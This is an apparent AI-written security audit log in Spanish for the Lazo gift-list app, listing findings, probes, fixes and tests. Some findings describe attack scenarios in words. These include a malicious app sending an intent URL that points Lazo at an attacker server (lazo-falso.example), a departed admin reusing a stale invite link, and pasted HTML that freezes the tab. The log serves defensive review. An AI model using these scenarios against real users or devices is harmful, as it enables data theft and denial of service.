| AMZ-1 a AMZ-8, AMZ-12 | No aplica | El camino (a) no existe: no hay ruta `amazon-import` ni `/wishlist` en `server/` (búsqueda sin resultados). Si se añade, siguen siendo condición previa |
| AMZ-9 títulos | Cumplido | `limpiaTitulo` quita controles y marcas de dirección, colapsa y corta a 200, en HTML y en texto. La vista previa pinta nodos de texto; `src/` sigue sin `innerHTML` ni `dangerouslySetInnerHTML`. Prueba unitaria con `hostil.html` y e2e |
| AMZ-10 enlaces, fotos, precios | Cumplido, con una enmienda | El enlace es siempre `https://www.amazon.es/dp/<ASIN>` (`conAsin`); ningún `href` se copia. Foto solo `https:` de los tres hosts, sin puerto ni credenciales. G-13 cerrado (`ItemSheet.tsx` exige `^https?://`; `Printable.tsx` usa `webUrl`). En texto plano las filas no llevan enlace ni foto, que es más estricto que lo pedido. **Enmienda:** prioridad y cantidad sí se importan (ver abajo) |
| AMZ-11 duplicados y LA REGLA | Cumplido | `esDuplicado` compara en el cliente con `listDetail` de la propia plaza (lo que la dueña ve). El alta va por `importItems`: lotes de `POST` de 50, sin ids. No hay hook de creación de `items` que lea filas existentes ni índice único sobre `items`, así que la respuesta no depende de lo oculto. Lo cubren PB-10 y V-26; falta una prueba de servidor específica (V11-6) |
| AMZ-13 proxy | No aplica | La demo solo tiene el camino (b) |
| AMZ-14 identificador de la lista | Cumplido en (b) | `listaId` solo detecta; el identificador no se envía, no se guarda y no se registra. Ver V11-5 sobre el identificador de las pruebas |
| AMZ-15 entradas hostiles | **Parcial** | Topes de 2 MB y 100 filas correctos; expresiones acotadas; el texto plano de 2 MB tarda unos 50 ms. El HTML tiene un caso cuadrático (V11-1) |
| AMZ-16 camino (b) | Cumplido | Lo pegado se lee del evento o de `clipboard.read()`, con `preventDefault`, y no entra en el DOM. `DOMParser` da un documento inerte. Vista previa sin `<img>`: ninguna petición a Amazon antes de confirmar. `connect-src` sin Amazon. Nada de lo pegado va a `localStorage`, a la IA ni al servidor |

### Enmienda a AMZ-10: prioridad y cantidad

Me parece bien. Son valores acotados (prioridad 1 a 3, cantidad 1 a 20), los eligió la dueña y ya los ve en su regalo: no tocan LA REGLA. Condición que el código cumple hoy y que debe seguir cumpliendo: **«Tiene» y «Comprado» no se leen nunca**. Ese recuento es estado (lo que otros ya le han comprado en Amazon) y traerlo a Lazo sería una fuga por otra puerta. `prioCantidad` solo casa `cantidad`, `necesita` y `quiere`. **Prueba que falta:** una ficha con «Necesita 2 · Tiene 1» da `quantity: 2` y ningún otro campo.

### Intent de Android

- **Superficie:** `ACTION_SEND` con `text/plain`, actividad exportada. Solo se lee `EXTRA_TEXT`; se ignoran `EXTRA_STREAM` y `EXTRA_HTML_TEXT`, así que no hay lectura de archivos ni de URIs ajenas, y lo recibido se analiza siempre como texto plano (sin enlaces ni fotos).
- **Tope:** 2 000 000 de caracteres en Java y otra vez en `guardaCompartido`. En la práctica Binder corta antes (alrededor de 1 MB por transacción).
- **Una sola vez:** `consume` cambia la acción a `MAIN`, de modo que girar la pantalla o recargar el WebView no repite la entrega. Excepción en V11-3.
- **Texto hostil:** solo produce filas de título y precio que la persona debe confirmar. No se devuelve nada a la app que llama.

### Hallazgos

**V11-1 (bajo; AMZ-15 no cumplido tal como se escribió) · El análisis del HTML es cuadrático.**
`parseListaHtml` recorre los 5 000 primeros enlaces aunque ya tenga 100 filas (`push` no corta el bucle) y, por cada uno, vuelve a analizar con `asinDe` todos los enlaces de sus contenedores. Lo mismo con fichas `data-itemid` anidadas. Medido con happy-dom: 4 000 enlaces a `/gp/product/<ASIN>` (215 KB) tardan 30 s; 400 fichas anidadas (100 KB), 11 s. A 2 MB son minutos. Además `comoLista` (`AddGift.tsx`) analiza lo pegado hasta dos veces antes de que `AmazonLista` lo haga una tercera.
*Escenario.* Alguien copia una página preparada (o una página grande de Amazon que enlaza por `/gp/product/`) y la pega: la pestaña se congela. No hay fuga ni escritura; solo se alcanza con HTML, no por el intent.
*Arreglo.* Salir de los dos bucles cuando `out.length >= MAX_PRODUCTOS`, calcular el ASIN de cada enlace una sola vez y saltar las fichas que contienen otra ficha.
*Prueba.* En `amazonLista.test.ts`: 2 MB de `<a href="/gp/product/B0…">` con ASIN distintos y 2 MB de `data-itemid` anidados terminan en menos de 500 ms. Bajar a 500 ms el umbral actual de 3 000.

**V11-2 (bajo) · Cualquier app instalada puede abrir Lazo en la vista previa con un texto suyo.**
*Escenario.* Una app envía `ACTION_SEND` a Lazo con 100 fichas inventadas. Lazo pasa a primer plano, salta a `#/amazon` (se pierde lo que hubiera a medias) y enseña 100 filas marcadas. Si la persona pulsa «Añadir», su lista se llena de títulos ajenos, en texto plano y sin enlaces. Hace falta ese toque.
*Arreglo opcional.* Cuando lo analizado viene del intent, un aviso «Texto recibido desde otra app» sobre la vista previa. No bloquea.
*Prueba.* e2e con `guardaCompartido`: nada se crea sin pulsar «Añadir».

**V11-3 (bajo) · El texto compartido vuelve si Android recrea la actividad.**
`setAction(MAIN)` cambia el intent en memoria. Si el sistema mata el proceso y la app se reabre desde Recientes, entrega otra vez el intent original y la vista previa reaparece. Deducido del código, no probado en un dispositivo.
*Arreglo.* En `SharePlugin.consume`, devolver `null` si `(intent.getFlags() & Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY) != 0`.
*Prueba.* Manual: compartir, activar «No mantener actividades» en las opciones de desarrollador y volver desde Recientes.

**V11-4 (bajo) · El texto pendiente sobrevive a un cierre de sesión.**
`pendiente` solo se borra cuando la hoja lo lee. Si no hay plaza (`AmazonDestino` se queda en el mensaje) o la persona cierra sesión antes, sigue en memoria hasta que muere el proceso, y lo vería quien entre después y abra `#/l/<id>/amazon`.
*Arreglo.* Llamar a `olvidaCompartido()` en la rama sin plaza de `AmazonDestino` y al cerrar sesión.
*Prueba.* `test/api/signout.test.ts`: tras cerrar sesión, `leeCompartido()` es `null`.

**V11-5 (bajo, privacidad) · Identificador de lista con aspecto real en las pruebas.**
`test/core/amazonLista.test.ts` usaba un identificador de lista con aspecto real en doce líneas (ya sustituido, no se repite aquí). Si es una lista real, el repositorio público enlaza a su dueña (justo lo que AMZ-14 evita). No lo he comprobado contra Amazon.
*Arreglo.* Confirmar que es inventado o sustituirlo por uno evidente (`LAZOTEST00001`), como ya hace la demo con `LAZODEMO2026X`.

**V11-6 (bajo) · Falta la prueba de servidor de AMZ-11.**
El comportamiento es correcto por construcción, pero la prueba descrita en AMZ-11 (quitar A reservado y B libre, reimportar ambos, misma respuesta y dos filas nuevas) no está en `server/test/rules.test.mjs`. Es la que impediría que un día alguien añada un índice único o un deduplicado en el servidor.

### Secretos

`.env.local` y `.env.*` están ignorados y no están en el índice (solo `.env.example` y `server/.env.example`); `dist/`, `dist-demo/` y `dist-apk/` también están ignorados. No se ha leído ni impreso ningún valor de `.env*`. La v1.1 no añade claves, variables de entorno ni permisos de Android. Las fixtures de `test/fixtures/amazon-lista/` son ficticias y no llevan datos personales. `DEMO_AMAZON_HTML` entra en todos los builds, también en el APK: es contenido de ejemplo, no un secreto.

### Estado

**V-11-1 a V-11-6 corregidos** (2026-11-12, Opus 5.5, junto con los arreglos 1 a 6 de `docs/design/v1.1/FABLE-REVISION.md`):

- **V11-1:** `parseListaHtml` para en 100 filas en los dos bucles, calcula el ASIN de cada enlace una vez, recorre los enlaces con `getElementsByTagName` y salida temprana, calcula los productos de cada contenedor una vez y salta las fichas que contienen otra. `comoLista` analiza lo pegado una sola vez. Pruebas: en Chromium (`e2e/amazon-lista.spec.ts`) 2 MB de enlaces a `/gp/product/` y 2 MB de fichas anidadas tardan menos de 500 ms; en Vitest, 4 000 enlaces (sueltos o en un mismo contenedor) menos de 500 ms, y los topes hostiles de siempre bajan de 3 000 a 500 ms. Con 2 MB, Vitest admite 1 500 ms porque happy-dom tarda unos 500 ms solo en construir el documento.
- **V11-2:** la vista previa de lo que llega por «Compartir» empieza con «Texto recibido de otra app» y nada se crea sin pulsar «Añadir» (e2e). El enlace de un producto suelto ya no acaba en «No encuentro productos»: va al alta normal.
- **V11-3:** `MainActivity` descarta el intent recibido si la actividad se recrea (`savedInstanceState`) o se abre desde Recientes (`FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY`). Sin probar en un Android real.
- **V11-4:** `olvidaCompartido()` al cerrar sesión (`PocketBaseApi.signOut`, probado en `test/api/signout.test.ts`) y cuando `AmazonDestino` no encuentra plaza.
- **V11-5:** el identificador de las pruebas es ahora `LAZOPRUEBA01` (sigue casando con `listaId`). El anterior sigue en el historial de git.
- **V11-6:** prueba AMZ-11 en `server/test/rules.test.mjs` (A cogido y B libre, quitados y reimportados en un lote: misma respuesta y dos filas nuevas) y prueba de la enmienda a AMZ-10 en `test/core/amazonLista.test.ts`: «Necesita 2 · Tiene 1» da solo `quantity: 2`, y «Tiene» y «Comprado» no se leen ni en texto ni en HTML.

---

## v1.1.2 (Fable 5.2)

Fecha: 2026-11-13 · Sobre `main` en `1483991` (cuatro commits por delante de `origin/main`). No existe la etiqueta `v1.1.1`: la base del diff es `aceec10` («release: versión 1.1.1»).

**Alcance.** Eliminar y salir del grupo (`e6fb15e`), atrás nativo y App Links (`72dde44`), `me()` cacheado y error boundary (`a9daba4`), icono (`d053c32`), y secretos en el repositorio y en los builds.

**Método.** Lectura del diff `aceec10..HEAD` y de `lazo.pb.js`, `lib/lazo.cjs`, las seis migraciones, `main.tsx`, `ctx.ts`, `atras.ts`, `pocketbase.ts`, `Connect.tsx`, `GroupExit.tsx`, `Join.tsx`, `MainActivity.java`, los dos manifiestos, `build.gradle`, `firmar-apk.sh` y `Caddyfile`. Ejecutado: `server/test/*.test.mjs` contra PocketBase 0.40.6 (**66 de 66**) y una sonda propia contra un PocketBase temporal con los hooks y migraciones actuales (salir, volver, tiempo real, borrado, tiempos). **No ejecutado:** vitest, Playwright, Gradle ni ningún Android real; no se ha construido el APK. El código de `@capacitor/app` no está en `node_modules` de esta copia (falta `npm ci`), así que lo que digo de `appUrlOpen` y `getLaunchUrl` sale de la documentación del plugin, no de leerlo. No se ha tocado código ni se ha leído ningún valor de `.env*`.

**Nota sobre las pruebas.** La suite pasa, pero el proceso de uno de los ficheros no terminó solo: se quedó vivo un `esbuild --service` hijo junto al PocketBase de `familia.test.mjs` y hubo que matarlos a mano (9 minutos de reloj). No afecta al resultado; en CI puede colgar el trabajo.

### Resumen

Ningún hallazgo crítico ni alto. **LA REGLA se mantiene desde la propia sesión**: ni salir, ni eliminar, ni volver dan a nadie una vista de su lista. Hay dos hallazgos medios, los dos con arreglo de pocas líneas, y cinco bajos.

| Gravedad | Hallazgos |
|---|---|
| Crítico | 0 |
| Alto | 0 |
| Medio | 2 (V-32, V-33) |
| Bajo | 5 (V-34 a V-38) |

### Respuesta a las preguntas

| Pregunta | Respuesta | Comprobación |
|---|---|---|
| ¿Se deduce algo de la propia lista al salir (respuesta, tiempos, reservas soltadas)? | **No** | `group-leave` no lee ninguna fila de la lista de quien sale: solo sus reservas y aportaciones hacia otros, y los enlaces de su plaza por id. Respuesta idéntica con mucho o con nada (prueba existente). Sonda: Carlos, con una reserva de Bea en su lista, recibe al salir Bea solo `groups:update` y `lists:update`; ningún evento de `claims`. Bea recibe el `delete` de su propia reserva y nada más; tras salir, su suscripción antigua no recibe nada. No he medido tiempos de `group-leave` (por lectura no dependen de la lista propia) |
| ¿Puede borrar quien no es dueño? | **No** | Sonda: `group-delete` por un admin 403; `DELETE` REST 403 (también a la dueña); lote con `DELETE` 403; `PATCH owner` por un admin 404; `PATCH members-` por un miembro 404 |
| ¿Quedan huérfanos visibles? | **No** | Tras eliminar, cero filas en las doce colecciones del servidor (sonda), además de la prueba que los busca por id. Quedan las cuentas, que es lo esperado |
| ¿El borrado delata a la dueña lo oculto de su lista? | **No** | Respuesta fija. Tiempo real: a la dueña le llegan 5 de 6 `items:delete` y 3 de 4 `claims:delete`; los que faltan son la sorpresa y la reserva de su lista, y no recibe ningún `budgets:delete`. Tiempo: con 60 regalos en su lista, 15 ms sin compras ocultas y 21 ms con 60 (medianas de 5, en loopback): 0,1 ms por fila, una sola medida posible y por debajo del ruido de la red. Sin hallazgo |
| ¿Salir y volver da otra vista? | **No con la misma cuenta** | Sonda: Bea sale y prueba otra plaza con su cuenta. Enlace personal: 400. Enlace general: queda pendiente y, al aceptarla el admin, 400 (V-5). Si vuelve a su plaza, la regla le oculta lo suyo desde la primera petición (prueba existente). Con una cuenta nueva hace falta un admin (R1), **salvo V-32** |
| ¿Salir y volver borra rastros? | Nada que no hiciera ya `plaza-release` | Salir vacía `via`, `approvedBy` y `claimedAt` de la plaza, igual que liberarla. La transparencia de R1 sigue siendo solo del estado actual. Pendiente antiguo, no nuevo |
| ¿Un enlace malicioso cambia el servidor? | **Con sesión, no. En el primer arranque, sí** | Con servidor guardado solo se acepta un enlace del mismo origen, y lo único que hace es `location.hash`. Sin servidor guardado, ver V-33 |
| ¿Redirecciones abiertas? | **No** | El fragmento debe casar entero con `#/unirse/<20 a 64 alfanuméricos>`; nunca se navega a una URL, solo se cambia el hash. `go()` y `stepsBackTo` solo comparan rutas internas. El filtro del manifiesto reclama únicamente `https://<LAZO_HOST>/` con `path="/"`: ni `/api` ni `/_/` |
| ¿`me()` puede quedarse con otro usuario? | **No** | Se recalcula de `authStore.record` en cada llamada y la caché se sustituye si cambia `id`, `name` o `color`; sin sesión vuelve a `null`. `User` no tiene más campos. `GroupExit` lleva `key={me.id}` |

Otras cosas comprobadas y bien: `assetlinks.json` solo lleva la huella pública del certificado (no es un secreto) y el APK de serie no reclama ningún dominio; `ErrorBoundary` no pinta el error, solo lo manda a la consola de un WebView no depurable; `?fallo` y `__lazoDemo` solo existen con `VITE_DEMO`; el proxy de Vite es solo de desarrollo; borrar la cuenta tras salir da 400 si quedan compras o un sorteo a su nombre, y la compra no pierde a su comprador.

### V-32 · Medio · Las invitaciones de quien sale (o es expulsado) siguen abriendo el grupo

`group-leave` y `plaza-release` solo anulan los enlaces **de la plaza** que se libera. Los que esa persona creó como admin (el general y los personales de otras plazas libres) siguen vivos, y un enlace personal entra al momento, sin que nadie lo apruebe.

*Escenario.* Carlos organiza sin ser el dueño. Genera el enlace personal de la plaza libre «Dani» y sale del grupo (o el dueño lo expulsa precisamente porque no se fía). Su lista queda como plaza libre: todos los miembros ven sus reservas y compras. Carlos abre el enlace de Dani en una ventana privada, entra como cuenta nueva y lee quién le ha reservado y comprado qué, con precios. Después pide que le devuelvan su plaza. Confirmado en la sonda: tras salir Carlos, `invite-info` 200, `join` 200, y la cuenta nueva ve las 2 filas de `claims` de la antigua lista de Carlos; la plaza queda con `approvedBy` = Carlos, que ya no es miembro.

*Por qué no es R1.* R1 acepta que un admin se quede una llave **mientras es de confianza para decidir quién entra**. Aquí la llave sobrevive a esa confianza, y desde la 1.1.2 perderla es un botón al alcance del propio interesado. El enlace general no es problema: sigue necesitando que un admin acepte.

*Arreglo.* Una invitación vale mientras quien la creó siga organizando. En `server/pb/pb_hooks/lib/lazo.cjs`, al final de `findInvite`, antes del `return`:

```js
// V-32: la invitación caduca con quien la creó (sale, lo expulsan o borra su cuenta).
if (!isAdmin(app.findRecordById('groups', inv.getString('group')), inv.getString('createdBy'))) throw new BadRequestError(BAD_INVITE);
```

y la misma condición dentro de la transacción de `join`, tras cargar `group`: `if (!L.isAdmin(group, inv.getString('createdBy'))) throw new BadRequestError(L.BAD_INVITE);`. Mismo mensaje que un token falso. Repetirlo en `inviteInfo` y `join` de `src/api/demo.ts`.

*Prueba.* En `server/test/grupo.test.mjs`: Carlos (admin) crea un enlace personal de una plaza libre y uno general; sale; `invite-info` y `join` con los dos dan 400 con el mismo cuerpo que un token inventado. Lo mismo tras `plaza-release` de un admin.

### V-33 · Medio · Cualquier app instalada puede fijar el servidor de Lazo en el primer arranque

`invite()` en `src/main.tsx` se registra en **todos** los APK, también en el de serie, que no reclama ningún dominio. Si aún no hay servidor guardado, se fía del origen de la URL que llega por `appUrlOpen` o `getLaunchUrl`, lo guarda y recarga, sin exigir `https`, sin `checkLazo` y sin que la persona vea ni confirme la dirección. `MainActivity` es exportada, de modo que la URL no tiene por qué venir de un App Link verificado: otra app puede mandar un `ACTION_VIEW` explícito a la actividad.

*Escenario.* La abuela instala Lazo. Antes de pegar su invitación, una app maliciosa del mismo móvil lanza `com.bertmarti.lazo/.MainActivity` con `https://lazo-falso.example/#/unirse/AAAAAAAAAAAAAAAAAAAA`. Lazo guarda ese servidor y enseña «Te han invitado a Navidad · lo organiza Marta» servido por el atacante. Entra, y su nombre y lo que pida van a un servidor ajeno. No hay pantalla para cambiar de servidor, y la invitación buena, cuando llegue, se descarta en silencio porque su origen no coincide. Variante: una URL `content://…#/unirse/…` guarda el origen `"null"` y la app queda inservible hasta borrar sus datos.

*Lo que no puede hacer.* Robar una sesión: solo actúa cuando no hay servidor guardado, y cerrar sesión no borra `lazo:server`. No he encontrado ningún camino que deje un token con el servidor vacío. Tampoco se alcanza desde una web: sin filtro no hay App Link, y con `LAZO_HOST` el sistema solo entrega los de ese dominio.

*Reservas.* Deducido del código; no probado en un dispositivo. En Android 13 o posterior el sistema puede descartar un intent explícito que no case con ningún filtro, lo que lo dejaría en bajo; en versiones anteriores se entrega.

*Arreglo.* Reutilizar `parseInvite` (ya exige `https` y el token) y aceptar un servidor nuevo solo si es el dominio con el que se compiló el APK:

```ts
const invite = (url?: string) => {
  const inv = url ? parseInvite(url) : null;
  if (!inv) return;
  const saved = read(SERVER_KEY);
  if (saved) {
    if (inv.server === saved) location.hash = `/unirse/${inv.token}`;
    return;
  }
  const host = import.meta.env.VITE_LAZO_HOST;
  if (!host || inv.server !== `https://${host}`) return; // un APK que no reclama dominio no acepta servidor por intent
  // …guardar, poner el hash y recargar, como hoy
};
```

con `VITE_LAZO_HOST="${LAZO_HOST:-}" npm run build` en `scripts/firmar-apk.sh`. Así el APK de serie ignora cualquier URL en el primer arranque (la persona pega el enlace en «Me han invitado», que sí valida).

*Prueba.* Sacar la decisión a una función pura y, en `test/ui/applink.test.ts`: sin servidor guardado y sin host de compilación, ninguna URL devuelve servidor; con host, solo `https://<host>/#/unirse/<token>`; `http://`, `content://`, otro host, `https://host@otro.example/…` y un token corto no devuelven nada; con servidor guardado, otro origen no cambia nada.

### V-34 · Bajo · El enlace de solo lectura de la lista de un niño sobrevive a quien sale

Salir borra el enlace de solo lectura de la plaza propia, pero no el de las listas de niños que esa persona llevaba. Por lectura del código (`group-leave` solo borra `shares` con `list = plaza.id`); no sondeado.

*Escenario.* El tío Javier lleva la lista de Leo, crea su enlace de solo lectura y sale del grupo. El enlace sigue enseñando el nombre de Leo y lo que pide a quien lo tenga. Nadie del grupo puede saber que existe, porque `shares` no se lee desde la API; solo se rota si alguien crea otro por casualidad. No hay estado, pero son datos de un menor en manos de quien ya no está.

*Arreglo.* En el bucle de listas de niños de `group-leave`, antes de `tx.save(l)`:

```js
for (const s of tx.findRecordsByFilter('shares', 'list = {:l}', '', 0, 0, { l: l.id })) tx.delete(s);
```

`plaza-release` tiene el mismo hueco y además no saca al expulsado de `managers`: conviene que haga el mismo bucle que `group-leave`.

*Prueba.* En `server/test/share.test.mjs`: quien lleva la lista de un niño crea el enlace y sale; `GET /api/lazo/shared/<token>` da el mismo 404 que un token falso. Igual tras `plaza-release`.

### V-35 · Bajo · Quien sale conserva su asignación del amigo invisible

La regla de `assignments` es `giver = yo`, sin exigir pertenencia. Sonda: fuera del grupo, Bea lista 0 filas en todas las colecciones menos `assignments` (1, con el id de su destinatario). Ya lo sabía, así que no es una fuga de la regla; pero «fuera no ve nada» no es cierto del todo y la prueba no lo mira.

*Arreglo.* Migración nueva: `assignments.listRule = assignments.viewRule = '@request.auth.id != "" && giver = @request.auth.id && draw.group.members.id ?= @request.auth.id'`.

*Prueba.* En `grupo.test.mjs`, añadir `assignments` y `draws` al bucle «fuera: no ve nada», con un sorteo hecho antes de salir.

### V-36 · Bajo · El APK compilado con `LAZO_HOST` se llama igual que el público

`firmar-apk.sh` escribe siempre `dist-apk/lazo-<versión>.apk`, lleve o no un dominio dentro. Si la variable está en el entorno al preparar la release, el APK publicado lleva en el manifiesto el dominio de casa de quien lo firma (a la vista de cualquiera con `aapt2`) y reclama sus enlaces en todos los móviles.

*Arreglo.* `OUT="dist-apk/lazo-$VER${LAZO_HOST:+-$LAZO_HOST}.apk"` y un aviso al terminar («este APK lleva tu dominio: no lo publiques»). Añadir a la lista de antes de subir: `aapt2 dump xmltree --file AndroidManifest.xml dist-apk/lazo-X.Y.Z.apk | grep -c autoVerify` debe dar 0.

*Prueba.* Manual, en la lista de publicación de `SECURITY.md`.

### V-37 · Bajo · Faltan las pruebas que fijan lo que hoy está bien

Lo comprobado en la sonda no tiene prueba que impida una regresión:

1. Tiempo real al salir: el dueño de una lista no recibe eventos de `claims` ni `contributions` cuando sale quien le había reservado; quien sale no recibe nada después.
2. Tiempo real al eliminar: la dueña no recibe `delete` de la sorpresa, las reservas ni el presupuesto de su lista.
3. V-5 tras salir: la misma cuenta en otra plaza da 400 por enlace personal y al aceptar una solicitud del enlace general.
4. `PATCH owner` por un admin y un lote con `DELETE` sobre `groups` siguen cerrados.

Las cuatro caben en `server/test/grupo.test.mjs` con el `listen` de `rules.test.mjs`. De paso, averiguar qué fichero deja vivo el servicio de esbuild.

### V-38 · Bajo · `SECURITY.md` no cuenta lo nuevo

No menciona `group-delete`, `group-leave` ni los App Links. Añadir a «Plazas y entrada»: salir suelta solo lo prometido, nunca toca la lista propia y responde siempre igual; eliminar es solo del dueño y solo por el endpoint; las invitaciones caducan con quien las creó (V-32). A «Otras medidas»: el APK de serie no reclama dominios ni acepta servidor por intent (V-33), `assetlinks.json` solo lleva la huella pública, y la comprobación de V-36.

### Secretos

- **Repositorio.** En el diff no hay claves, tokens, rutas locales ni direcciones reales: solo `milazo.duckdns.org` de ejemplo y las credenciales de usar y tirar del PocketBase de pruebas (`su@lazo.invalid`). Siguen fuera del índice `.env`, `.env.local`, `*.jks`, `dist/`, `dist-demo/`, `dist-apk/` y `server/data/`. `gitleaks` no está instalado en esta máquina: la búsqueda ha sido por patrones, y queda el gitleaks de CI.
- **Builds.** El código solo lee `VITE_DEMO` y `VITE_SERVER_URL`; `vite.config.ts` no cambia `envPrefix` ni usa `define`. `.env.local` solo tiene nombres sin prefijo `VITE_` (he mirado los nombres, no los valores), así que Vite no los mete en la demo ni en el APK. En `dist/`, `dist-demo/` y `android/app/src/main/assets/public/` de esta copia no hay ninguna cadena con forma de clave de Gemini, NVIDIA, Groq o Anthropic.
- **`assetlinks.json`.** Se publica en la demo y en cada servidor; es la huella del certificado, que ya imprime cualquier APK. Quien firme con otra clave y no la cambie solo consigue que la verificación falle y el enlace se abra en el navegador.
- **Observación, no nueva.** Todos los commits llevan un correo de autor de un dominio corporativo, ya público en `origin`. Si no es intencionado, se arregla en la configuración de git para los próximos; reescribir el historial es decisión del autor.

### Veredicto

**Apto.** No hay hallazgos críticos ni altos, las 66 pruebas de servidor pasan contra PocketBase real y no conozco ninguna vía nueva por la que alguien vea o deduzca el estado de su propia lista desde su sesión. No hay secretos en el repositorio ni en los builds.

V-32 y V-33 deberían entrar en esta misma versión: son unas diez líneas entre los dos y cierran las dos únicas puertas nuevas (una llave que sobrevive a quien sale y un servidor que se fija sin preguntar). Los bajos pueden ir en la siguiente.

Condiciones de publicación:

1. El APK público sale de `scripts/firmar-apk.sh` **sin** `LAZO_HOST` en el entorno (V-36) y `grep -c debuggable` sigue dando 0.
2. `versionName` y `versionCode` de `android/app/build.gradle` (hoy `1.1.1` y `12`) y `version` de `package.json` suben antes de firmar; con el mismo `versionCode` Android no actualiza.
3. `npm ci` antes de compilar: `@capacitor/app` está en `package.json` pero no instalado en esta copia.

### Estado (2026-11-13, Opus 5.5): V-32 a V-38 corregidos

- **V-32:** `findInvite` (`lib/lazo.cjs`) y la transacción de `join` rechazan con `BAD_INVITE` la invitación cuyo `createdBy` ya no es admin del grupo (sale, lo expulsan, deja de organizar o borra su cuenta). `group-leave` y `plaza-release` llaman a `L.soltar`, que además revoca sus invitaciones vivas. Lo mismo en `inviteInfo` y `join` de `src/api/demo.ts`. Prueba en `server/test/grupo.test.mjs`: tras salir Carlos, su enlace personal y el general dan en `invite-info` y `join` el mismo 400 y el mismo cuerpo que un token inventado y la plaza sigue libre; igual tras quitarle a Eva el rol de admin (sin revocar: lo para `findInvite`) y tras `plaza-release`, que deja sus invitaciones `revoked`. Sin el arreglo falla (200).
- **V-33:** `linkAction(url, guardado, host)` en `Connect.tsx`, función pura sobre `parseInvite`: la URL entera debe ser `https://…#/unirse/<token>`; con servidor guardado solo cambia la ruta si el origen coincide; sin él, solo acepta `https://<LAZO_HOST>`. `main.tsx` la usa con `import.meta.env.VITE_LAZO_HOST`, que `firmar-apk.sh` y `build-apk.sh` pasan como `VITE_LAZO_HOST="${LAZO_HOST:-}" npm run build`: el APK de serie no acepta ningún servidor por intent. Prueba: `test/ui/applink.test.ts` (sin host, nada; con host, solo el suyo; `http`, `content`, otro host, `host@otro`, token corto y enlaces escondidos dentro de otra URL, nada).
- **V-34:** `L.soltar` saca a quien sale o es expulsado de las listas de niños que llevaba (si se quedan sin nadie, al dueño) y borra su enlace de solo lectura; `plaza-release` ya no se lo deja. Prueba en `grupo.test.mjs`: el enlace de Leo (tras salir) y el de Mía (tras `plaza-release`) responden como uno inventado y las llevan el dueño.
- **V-35:** migración `1762910000_asignaciones.js`: `assignments` exige además `draw.group.members.id ?= @request.auth.id`. No se borra la fila: el sorteo es de todos y es la que dice a quién le tocaba regalar. Prueba: fuera, `draws` y `assignments` dan 0 (sin la migración, 1); la fila sigue existiendo.
- **V-36:** `firmar-apk.sh` escribe `lazo-<ver>-<host>.apk` con `LAZO_HOST` y avisa de no publicarlo; sin `LAZO_HOST`, falla si el manifiesto lleva `autoVerify`. Prueba: `server/test/firmar.test.mjs` evalúa la línea `OUT=` con y sin `LAZO_HOST`. No se ha firmado ningún APK aquí.
- **V-37:** en `grupo.test.mjs`, (1) al salir Bea, Carlos no recibe ningún evento de las reservas de su lista y Bea solo el `delete` de su propia reserva; (2) al eliminar, la dueña no recibe el borrado de la sorpresa, de la reserva ni del presupuesto de su lista; (3) V-5 tras salir: 400 por enlace personal y al aceptar la solicitud del enlace general; (4) `PATCH owner` por un admin y un lote con `DELETE` sobre `groups` siguen cerrados. El cuelgue de `esbuild --service` no se ha reproducido (la suite termina sola en 18 s), así que no se ha tocado.
- **V-38:** `SECURITY.md`: salir, eliminar y llaves que caducan con quien las creó en «Plazas y entrada»; App Links y enlaces que llegan a la app en «Otras medidas»; el nombre `-<host>` y la comprobación de `autoVerify` en «Firmar el APK»; las pruebas nuevas.
- **De paso:** `e2e/avisos.spec.ts` fallaba en móvil también sin estos cambios (recargaba mientras cerrar la hoja hacía `history.back()`); ahora espera a que termine.
- **Pruebas:** `server/test/*.test.mjs` 68/68 contra PocketBase 0.40.6; `npm run check` en verde (233 pruebas de vitest, 4 saltadas); Playwright completo con `PB_BIN` 163 en verde y 69 saltadas; `scripts/build-apk.sh` compila el APK de depuración.

**Estado:** V-32 resuelto · V-33 resuelto · V-34 resuelto · V-35 resuelto · V-36 resuelto (sin firmar un APK real) · V-37 resuelto (cuelgue de esbuild no reproducido) · V-38 resuelto.

---

## Auditoría v1.2.0 (Fable 5.2)

Fecha: 2026-11-13 · Sobre `main` en `5d8080f` (fusión de `v120-amazon`, un solo commit: `bfb1c1b`). Diff revisado: `86e4c35..HEAD`, 32 archivos.

**Alcance.** La lectura automática de listas de deseos de Amazon desde el servidor (camino a): `server/unfurl/{wishlist,fetch,index,guard}.mjs`, `src/core/amazonServidor.ts`, `server/pb/pb_hooks/amazon.pb.js`, `lib/amazon.cjs`, la migración `1762920000_amazon.js`, `AddGift.tsx`, `AmazonLista.tsx`, `demo.ts`, `pocketbase.ts`, `docker-compose.yml`, el `Dockerfile` de `unfurl`, las fixtures nuevas y los secretos.

**Decisión de quien es dueño del proyecto, que esta auditoría no discute.** La función existe, la enciende quien aloja con `AMAZON_IMPORT=on`, va apagada en el repositorio y él asume el riesgo con las condiciones de Amazon. Nunca se saltan captchas y nunca se usan sesiones ni cookies de Amazon. La recomendación de `docs/legal/AMAZON.md` de no hacer el camino (a) queda superada por esa decisión.

**Método.** Lectura del diff y de los archivos citados. Ejecutado: `node --test server/unfurl/test/*.test.mjs` (**18 de 18**, Node 24 en Windows); `server/test/amazon.test.mjs` contra PocketBase 0.40.6 en WSL (**6 de 6**); `vitest` sobre `amazonServidor.test.ts` y `amazonLista.test.ts` (**34 de 34**); y una sonda propia contra `once()` y `parsePaginaLista` (bombas de descompresión y 3 MB hostiles; resultados abajo). **No ejecutado:** Playwright, el resto de las suites, `gitleaks` (no está instalado aquí; queda el de CI), Docker, ni **ninguna petición a Amazon**: lo que digo de cómo responde Amazon (filtros, 403, vista de invitado) sale de las fixtures y de lo que sé, no de una comprobación en vivo. No se ha tocado código ni se ha leído ningún valor de `.env*`.

**Nota.** Durante la revisión aparecieron en la copia de trabajo cambios sin confirmar que no son míos (`CHANGELOG.md`, `package.json`, `package-lock.json` y `android/app/build.gradle`, la subida a 1.2.0). No están en el diff revisado.

### Resumen

Ningún hallazgo crítico ni alto. **LA REGLA de Lazo se mantiene:** las tres rutas nuevas no leen ni escriben `items`, `claims` ni ninguna colección salvo la pertenencia a un grupo, el servidor no deduplica y la respuesta es la misma la pida quien la pida. El SSRF está bien cerrado y no hay bomba de descompresión. Hay dos hallazgos medios y cinco bajos. El primero (V-39) es el único que toca la sorpresa, y no la de Lazo sino la de Amazon.

| Gravedad | Hallazgos |
|---|---|
| Crítico | 0 |
| Alto | 0 |
| Medio | 2 (V-39, V-40) |
